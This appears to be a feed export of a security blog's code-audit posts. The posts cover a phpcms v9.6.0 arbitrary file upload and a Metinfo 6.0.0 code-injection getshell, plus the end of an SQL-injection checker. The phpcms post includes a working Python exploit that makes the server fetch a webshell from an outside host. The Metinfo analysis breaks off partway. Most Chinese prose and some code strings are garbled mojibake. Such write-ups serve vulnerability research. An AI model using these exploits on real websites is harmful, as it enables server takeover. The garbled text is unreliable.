Ê≥®ÂÖ•</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">"[+] Congraduations! This url is Vulnerable! "</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"[-] Not vulnerable!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">     url = sys.argv[<span class="number">1</span>]</span><br><span class="line">     poc(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-ÊºèÊ¥ûÂàÜÊûê&quot;&gt;&lt;a href=&quot;#0x01-ÊºèÊ¥ûÂàÜÊûê&quot; class=&quot;headerlink&quot; title=&quot;0x01 ÊºèÊ¥ûÂàÜÊûê&quot;&gt;&lt;/a&gt;0x01 ÊºèÊ¥ûÂàÜÊûê&lt;/h2&gt;&lt;p&gt;ÊºèÊ¥ûÂèëÁîüÂú® /Applications/MxSrvs/www/phpcms_V9.6
      
    
    </summary>
    
    
      <category term="‰ª£Á†ÅÂÆ°ËÆ°" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phpcms_v9.6.0 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†</title>
    <link href="http://patrilic.top/2019/04/03/phpcms_v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://patrilic.top/2019/04/03/phpcms_v9.6.0 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†/</id>
    <published>2019-04-03T02:58:32.000Z</published>
    <updated>2019-07-08T15:43:26.511Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-ÊºèÊ¥ûÂàÜÊûê"><a href="#0x01-ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="0x01 ÊºèÊ¥ûÂàÜÊûê"></a>0x01 ÊºèÊ¥ûÂàÜÊûê</h2><p>ÊºèÊ¥û urlÔºö</p><blockquote><p><a href="http://localhost/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1" target="_blank" rel="noopener">http://localhost/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</a></p></blockquote><p>Ë∑üËøõ /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/member/index.php</p><p>ÊºèÊ¥û‰ª£Á†Å‰ªé129Ë°å-136Ë°å<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line"><span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>$_POST[‚Äòinfo‚Äô] Ë¢´ÂáΩÊï∞ new_html_special_chars ËøáÊª§‰∏ÄÈÅç<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_html_special_chars</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$encoding = <span class="string">'utf-8'</span>;</span><br><span class="line"><span class="keyword">if</span>(strtolower(CHARSET)==<span class="string">'gbk'</span>) $encoding = <span class="string">'ISO-8859-15'</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_array($string)) <span class="keyword">return</span> htmlspecialchars($string,ENT_QUOTES,$encoding);</span><br><span class="line"><span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) $string[$key] = new_html_special_chars($val);</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>htmlspecialchars($string, ENT_QUOTES, $encoding)<br>ÂÆû‰ΩìÂåñÁºñÁ†Å ÂçïÂºïÂè∑ÂíåÂèåÂºïÂè∑<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>();</span><br><span class="line">$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line"><span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line"><span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">$field = safe_replace($field);</span><br><span class="line">$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ“™ÔøΩÔøΩ"</span>;</span><br><span class="line">$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line"><span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ $minlength ÔøΩÔøΩÔøΩ÷∑ÔøΩÔøΩÔøΩ"</span>);</span><br><span class="line"><span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'ƒ£ÔøΩÔøΩÔøΩ–≤ÔøΩÔøΩÔøΩÔøΩÔøΩ'</span>.$field.<span class="string">'ÔøΩ÷∂ÔøΩ'</span>);</span><br><span class="line"><span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">showmessage(<span class="string">"$name ÔøΩÔøΩÔøΩ√≥ÔøΩÔøΩÔøΩ $maxlength ÔøΩÔøΩÔøΩ÷∑ÔøΩÔøΩÔøΩ"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">str_cut($value, $maxlength);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name ÔøΩÔøΩ÷µÔøΩÔøΩÔøΩÔøΩÔøΩÿ∏ÔøΩÔøΩÔøΩ"</span>);</span><br><span class="line">$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">$info[$field] = $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ÂèÇÊï∞‰º†ÂÖ•Ôºö<br>È¶ñÂÖàÁªèËøá trim_script ÂáΩÊï∞Ôºå ËøáÊª§ÊéâscriptÂíåiframe<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim_script</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">$str = preg_replace ( <span class="string">'/\&lt;([\/]?)script([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1script\\2&amp;gt;'</span>, $str );</span><br><span class="line">$str = preg_replace ( <span class="string">'/\&lt;([\/]?)iframe([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1iframe\\2&amp;gt;'</span>, $str );</span><br><span class="line">$str = preg_replace ( <span class="string">'/\&lt;([\/]?)frame([^\&gt;]*?)\&gt;/si'</span>, <span class="string">'&amp;lt;\\1frame\\2&amp;gt;'</span>, $str );</span><br><span class="line">$str = preg_replace ( <span class="string">'/]]\&gt;/si'</span>, <span class="string">']] &gt;'</span>, $str );</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ÂÜçÁªèËøásafe_replace ÂáΩÊï∞ÔºåËøáÊª§ÁâπÊÆäÂ≠óÁ¨¶<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string); <span class="comment">// Á©∫Ê†º</span></span><br><span class="line">$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string); <span class="comment">// ÂçïÂºïÂè∑</span></span><br><span class="line">$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string); <span class="comment">// ÂèåÈáçÁºñÁ†Å</span></span><br><span class="line">$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string); </span><br><span class="line">$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string); </span><br><span class="line">$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string); </span><br><span class="line">$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);  </span><br><span class="line">$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br></pre></td></tr></table></figure><p><img src="/phpcms_v9.6.0 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.resources/7AD3B062-8D57-4659-8362-E8E0651D552F.png" alt="a2c24d4398d5221982a1cfa140d52d79"></p><p>ediotr ÊñπÊ≥ï<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'spider_img'</span>])) $enablesaveimage = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($enablesaveimage) &#123;</span><br><span class="line">$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>$value = $this-&gt;attachment-&gt;download(‚Äòcontent‚Äô, $value, $watermark_enable);</p><p>‰º†ÂÖ•ÁöÑË¢´Â∏¶ÂÖ•downloadÂáΩÊï∞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $image_d;</span><br><span class="line"><span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">$uploadpath = $upload_url.$dir;</span><br><span class="line">$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">$string = new_stripslashes($value);</span><br><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">dir_create($uploaddir);</span><br><span class="line">$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($matches, $string);</span><br><span class="line">$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">$filename = fileext($file);</span><br><span class="line">$file_name = basename($file);</span><br><span class="line">$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">$newfile = $uploaddir.$filename;</span><br><span class="line">$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line"><span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">$oldpath[] = $k;</span><br><span class="line">$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">$fileext = fileext($filename);</span><br><span class="line"><span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">&#125;</span><br><span class="line">$filepath = $dir.$filename;</span><br><span class="line">$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line"><span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wafÔºö</p><blockquote><p>if(!preg_match_all(‚Äú/(href|src)=([\‚Äù|‚Äô]?)([^ \‚Äù‚Äò&gt;]+.($ext))\2/i‚Äù, $string, $matches)) return $value;</p></blockquote><p>ÂêéÁºÄÔºö$ext = ‚Äògif|jpg|jpeg|bmp|png‚Äô<br>‰ΩøÁî® php#.jpg ÁªïËøá</p><p>ËøõÂÖ•Âà∞ fillurl ÂáΩÊï∞<br>Âú® 301 Ë°åÂéªÊéâ‰∫Ü #</p><blockquote><p>\$pos = strpos($surl,‚Äô#‚Äô);</p></blockquote><p>$remotefileurls = <a href="http://url/shell.php" target="_blank" rel="noopener">http://url/shell.php</a></p><h2 id="0x02-ÊºèÊ¥ûÂ§çÁé∞"><a href="#0x02-ÊºèÊ¥ûÂ§çÁé∞" class="headerlink" title="0x02 ÊºèÊ¥ûÂ§çÁé∞"></a>0x02 ÊºèÊ¥ûÂ§çÁé∞</h2><p><img src="/phpcms_v9.6.0 ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†.resources/2DD865E1-9D37-4837-9F17-2421D3523708.png" alt="1192bc6a47731354afb36b986b5dc6a6"></p><h2 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018-12-20 22:57</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: file_writein_poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/phpcms_V9.6.0/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1'</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">'siteid'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'modelid'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'testxx'</span>,</span><br><span class="line">        <span class="string">'email'</span>: <span class="string">'test@test.com'</span>,</span><br><span class="line">        <span class="string">'info[content]'</span>: <span class="string">'&lt;img src=http://url/shell.txt?.php#.jpg&gt;'</span>,</span><br><span class="line">        <span class="string">'dosubmit'</span>: <span class="string">'1'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">poc = requests.post(url,data= data)</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-ÊºèÊ¥ûÂàÜÊûê&quot;&gt;&lt;a href=&quot;#0x01-ÊºèÊ¥ûÂàÜÊûê&quot; class=&quot;headerlink&quot; title=&quot;0x01 ÊºèÊ¥ûÂàÜÊûê&quot;&gt;&lt;/a&gt;0x01 ÊºèÊ¥ûÂàÜÊûê&lt;/h2&gt;&lt;p&gt;ÊºèÊ¥û urlÔºö&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http:
      
    
    </summary>
    
    
      <category term="‰ª£Á†ÅÂÆ°ËÆ°" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Metinfo 6.0.0 ‰ªªÊÑè‰ª£Á†ÅÂÜôÂÖ•ÂØºËá¥getshell</title>
    <link href="http://patrilic.top/2019/04/03/Metinfo%206.0.0%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5/"/>
    <id>http://patrilic.top/2019/04/03/Metinfo 6.0.0 ‰ªªÊÑè‰ª£Á†ÅÂÜôÂÖ•/</id>
    <published>2019-04-03T02:58:32.000Z</published>
    <updated>2019-07-08T15:42:50.466Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-ÊºèÊ¥ûÂàÜÊûê"><a href="#0x01-ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="0x01 ÊºèÊ¥ûÂàÜÊûê"></a>0x01 ÊºèÊ¥ûÂàÜÊûê</h2><p>ÊºèÊ¥ûÂÖ≥ÈîÆÁÇπ<br>‰Ωç‰∫é/Applications/MxSrvs/www/MetInfo6.0.0/admin/include/global.func.php‰∏≠Á∫¶878Ë°åÁöÑCopyindxÂáΩÊï∞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyindx</span><span class="params">($newindx,$type)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($newindx))&#123;</span><br><span class="line">$oldcont =<span class="string">"&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line">$fp = fopen($newindx,w);</span><br><span class="line">fputs($fp, $oldcont);</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>$typeÂèØÊéßÔºåÂπ∂‰∏îÁõ¥Êé•Â∏¶ÂÖ•Âà∞php‰ª£Á†Å‰∏≠ÔºåÂâçÊèêÊòØ‰∏çÂ≠òÂú® $newindx ÂèòÈáèÔºåÂæÄ‰∏äË∑üÂáΩÊï∞</p><p>‰Ωç‰∫é/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/global.func.phpÁöÑ124Ë°åË∞ÉÁî®ËØ•ÂáΩÊï∞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyindx(ROOTPATH.$foldername.<span class="string">'/index.php'</span>,$module);</span><br></pre></td></tr></table></figure></p><p>ËßÑÂÆö $newindx ‰∏∫ÁõÆÂΩïÂêç + /index.php, ÁÑ∂Âêé $module ËØ•Êñá‰ª∂  </p><p>ÂÜçÂæÄ‰∏äË∑üÔºåÊâæÂà∞/Applications/MxSrvs/www/MetInfo6.0.0/admin/column/save.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($if_in==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>($filename!=<span class="string">''</span> &amp;&amp; $filename!=$filenameold)&#123;</span><br><span class="line">$filenameok = $db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$met_column&#125; WHERE filename='&#123;$filename&#125;' and foldername='$foldername' and id!='$id'"</span>);</span><br><span class="line"><span class="keyword">if</span>($filenameok)metsave(<span class="string">'-1'</span>,$lang_modFilenameok);</span><br><span class="line"><span class="keyword">if</span>(is_numeric($filename) &amp;&amp; $filename!=$id &amp;&amp; $met_pseudo)&#123;</span><br><span class="line">$filenameok1 = $db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$met_column&#125; WHERE id='&#123;$filename&#125;' and foldername='$foldername'"</span>);</span><br><span class="line"><span class="keyword">if</span>($filenameok1)metsave(<span class="string">'-1'</span>,$lang_jsx30);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$filedir=<span class="string">"../../"</span>.$foldername;</span><br><span class="line"><span class="keyword">if</span>(!file_exists($filedir))@mkdir($filedir,<span class="number">0777</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($filedir))metsave(<span class="string">'-1'</span>,$lang_modFiledir);</span><br><span class="line">column_copyconfig($foldername,$module,$id);</span><br></pre></td></tr></table></figure><p>Êª°Ë∂≥ËØ•Êù°‰ª∂Âç≥ÂèØË∞ÉÁî®colnmn_copyconfig()ÂáΩÊï∞</p><p><strong>ÊîªÂáªÊµÅÁ®ã</strong> 